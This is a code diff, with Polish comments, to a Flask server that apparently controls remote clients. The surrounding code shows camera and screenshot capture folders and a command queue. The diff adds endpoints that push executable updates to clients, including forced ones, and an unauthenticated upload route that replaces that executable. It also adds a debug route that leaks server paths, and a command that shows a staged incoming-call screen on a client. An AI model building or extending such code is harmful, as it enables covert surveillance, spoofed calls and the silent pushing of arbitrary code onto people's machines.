@@ -16,17 +16,35 @@ os.makedirs(CAMERA_DIR, exist_ok=True)
 SCREENSHOTS_DIR = "screenshots"
 os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
 
-# Ścieżka do pliku z nazwami
-NAMES_FILE = "name.txt"
+UPDATES_DIR = "updates"
+os.makedirs(UPDATES_DIR, exist_ok=True)
 
-# Przechowywanie klientów
+VERSIONS_FILE = os.path.join(UPDATES_DIR, "versions.json")
+
+NAMES_FILE = "name.txt"
 clients = {}
 client_lock = threading.Lock()
 
-# Słownik z niestandardowymi nazwami klientów
 custom_names = {}
 
-# Ładowanie nazw z pliku przy starcie
+def init_versions_file():
+    if not os.path.exists(VERSIONS_FILE):
+        default_versions = {
+            "program.exe": {
+                "version": "1.0.0",
+                "filename": "program1.exe",
+                "description": "Główny program",
+                "release_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                "min_version": "1.0.0",
+                "force_update": False
+            }
+        }
+        with open(VERSIONS_FILE, 'w', encoding='utf-8') as f:
+            json.dump(default_versions, f, indent=4, ensure_ascii=False)
+        print("📝 Utworzono domyślny plik versions.json")
+
+init_versions_file()
+
 def load_custom_names():
     global custom_names
     try:
@@ -88,6 +106,172 @@ def index():
     return render_template('index.html')
 
 # Dodaj te nowe endpointy:
+
+@app.route('/api/updates/check/<client_version>')
+def check_updates(client_version):
+    """Sprawdź czy jest nowsza wersja dla klienta"""
+    try:
+        with open(VERSIONS_FILE, 'r', encoding='utf-8') as f:
+            versions = json.load(f)
+        
+        latest = versions.get("program.exe", {})
+        latest_version = latest.get("version", "1.0.0")
+        
+        # Porównaj wersje (proste porównanie string, możesz użyć packaging.version dla lepszego porównania)
+        needs_update = client_version != latest_version
+        
+        return jsonify({
+            'success': True,
+            'needs_update': needs_update,
+            'latest_version': latest_version,
+            'filename': latest.get('filename'),
+            'force_update': latest.get('force_update', False),
+            'description': latest.get('description', '')
+        })
+        
+    except Exception as e:
+        print(f"❌ Błąd sprawdzania aktualizacji: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/debug/updates')
+def debug_updates():
+    """Endpoint diagnostyczny do sprawdzenia konfiguracji"""
+    try:
+        # Sprawdź czy folder istnieje
+        folder_exists = os.path.exists(UPDATES_DIR)
+        
+        # Lista plików w folderze
+        files = []
+        if folder_exists:
+            files = os.listdir(UPDATES_DIR)
+        
+        # Sprawdź plik versions.json
+        versions = {}
+        versions_exists = os.path.exists(VERSIONS_FILE)
+        if versions_exists:
+            with open(VERSIONS_FILE, 'r', encoding='utf-8') as f:
+                versions = json.load(f)
+        
+        # Ścieżki
+        current_dir = os.getcwd()
+        
+        return jsonify({
+            'success': True,
+            'server_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            'current_directory': current_dir,
+            'updates_folder': {
+                'exists': folder_exists,
+                'path': os.path.join(current_dir, UPDATES_DIR),
+                'files': files
+            },
+            'versions_file': {
+                'exists': versions_exists,
+                'path': os.path.join(current_dir, VERSIONS_FILE),
+                'content': versions
+            },
+            'endpoints': {
+                'check': '/api/updates/check/<version>',
+                'download': '/api/updates/download/<filename>',
+                'list': '/api/updates/list'
+            }
+        })
+    except Exception as e:
+        return jsonify({
+            'success': False,
+            'error': str(e)
+        }), 500
+
+@app.route('/api/updates/download/<filename>')
+def download_update(filename):
+    """Pobierz plik aktualizacji"""
+    try:
+        # Zabezpieczenie przed path traversal
+        if '..' in filename or filename.startswith('/'):
+            return jsonify({'error': 'Invalid filename'}), 400
+            
+        filepath = os.path.join(UPDATES_DIR, filename)
+        if os.path.exists(filepath):
+            return send_from_directory(UPDATES_DIR, filename, as_attachment=True)
+        else:
+            return jsonify({'error': 'File not found'}), 404
+            
+    except Exception as e:
+        print(f"❌ Błąd pobierania pliku: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/updates/list')
+def list_updates():
+    """Lista dostępnych aktualizacji (dla panelu admina)"""
+    try:
+        files = []
+        for filename in os.listdir(UPDATES_DIR):
+            if filename.endswith('.exe') and filename != 'versions.json':
+                filepath = os.path.join(UPDATES_DIR, filename)
+                stat = os.stat(filepath)
+                files.append({
+                    'filename': filename,
+                    'size': stat.st_size,
+                    'modified': datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
+                })
+        
+        # Sortuj od najnowszych
+        files.sort(key=lambda x: x['modified'], reverse=True)
+        
+        return jsonify({
+            'success': True,
+            'files': files,
+            'versions': json.load(open(VERSIONS_FILE, 'r', encoding='utf-8'))
+        })
+        
+    except Exception as e:
+        print(f"❌ Błąd listowania aktualizacji: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/updates/upload', methods=['POST'])
+def upload_update():
+    """Wgraj nową wersję pliku (dla panelu admina)"""
+    try:
+        if 'file' not in request.files:
+            return jsonify({'success': False, 'error': 'No file'})
+        
+        file = request.files['file']
+        version = request.form.get('version', '1.0.0')
+        description = request.form.get('description', '')
+        force = request.form.get('force', 'false').lower() == 'true'
+        
+        if file.filename == '':
+            return jsonify({'success': False, 'error': 'Empty filename'})
+        
+        # Generuj nazwę pliku z wersją
+        base_name = os.path.splitext(file.filename)[0]
+        ext = os.path.splitext(file.filename)[1]
+        new_filename = f"{base_name}{version.replace('.', '_')}{ext}"
+        
+        # Zapisz plik
+        filepath = os.path.join(UPDATES_DIR, new_filename)
+        file.save(filepath)
+        
+        # Aktualizuj versions.json
+        with open(VERSIONS_FILE, 'r', encoding='utf-8') as f:
+            versions = json.load(f)
+        
+        versions["program.exe"] = {
+            "version": version,
+            "filename": new_filename,
+            "description": description,
+            "release_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "force_update": force
+        }
+        
+        with open(VERSIONS_FILE, 'w', encoding='utf-8') as f:
+            json.dump(versions, f, indent=4, ensure_ascii=False)
+        
+        print(f"📦 Wgrano nową wersję {version}: {new_filename}")
+        return jsonify({'success': True, 'filename': new_filename})
+        
+    except Exception as e:
+        print(f"❌ Błąd wgrywania aktualizacji: {e}")
+        return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/get_names_file')
 def get_names_file():
@@ -517,6 +701,17 @@ def get_command():
             command = clients[client_id].get('command')
             if command:
                 clients[client_id]['command'] = None
+                
+                # Sprawdź czy komenda to JSON (dynamiczne połączenie)
+                try:
+                    # Próba sparsowania jako JSON
+                    cmd_data = json.loads(command)
+                    if isinstance(cmd_data, dict) and cmd_data.get('command') == 'call':
+                        return jsonify(cmd_data)
+                except:
+                    pass
+                
+                # Zwykła komenda tekstowa
                 return jsonify({
                     'registered': True,
                     'command': command
@@ -533,6 +728,62 @@ def get_command():
             'registered': False,
             'error': 'server_error'
         })
+
+@app.route('/api/send_dynamic_call', methods=['POST'])
+def send_dynamic_call():
+    """
+    Wysyła dynamiczną komendę połączenia do klienta
+    Oczekiwane dane:
+    {
+        "client_id": "id_klienta",
+        "name": "Imię Nazwisko",
+        "image_url": "https://example.com/image.jpg",  # opcjonalnie
+        "image_base64": "base64...",  # opcjonalnie
+        "bg_color": "black"  # opcjonalnie
+    }
+    """
+    try:
+        data = request.json
+        client_id = data.get('client_id')
+        
+        if not client_id:
+            return jsonify({'success': False, 'error': 'Brak client_id'})
+        
+        # Przygotuj komendę
+        command_data = {
+            'command': 'call',
+            'name': data.get('name', 'Nieznany'),
+            'bg_color': data.get('bg_color', 'black')
+        }
+        
+        # Dodaj obraz jeśli jest
+        if data.get('image_url'):
+            command_data['image_url'] = data['image_url']
+        
+        if data.get('image_base64'):
+            command_data['image_base64'] = data['image_base64']
+        
+        # Wyślij do klienta
+        with client_lock:
+            if client_id in clients:
+                clients[client_id]['command'] = json.dumps(command_data)  # Zapisz jako JSON string
+                clients[client_id]['command_time'] = time.time()
+                
+                client_name = custom_names.get(client_id) or clients[client_id].get('name', client_id[:8])
+                print(f"📞 Wysłano dynamiczne połączenie do {client_name}: {command_data['name']}")
+                return jsonify({'success': True})
+            else:
+                return jsonify({'success': False, 'error': 'Client not found'})
+                
+    except Exception as e:
+        print(f"❌ Błąd wysyłania dynamicznego połączenia: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+# Dodaj też endpoint do testowania
+@app.route('/api/test_dynamic_call/<client_id>')
+def test_dynamic_call(client_id):
+    """Testowy endpoint do szybkiego testowania"""
+    return render_template('test_call.html', client_id=client_id)
 
 @app.route('/api/send_command', methods=['POST'])
 def send_command():
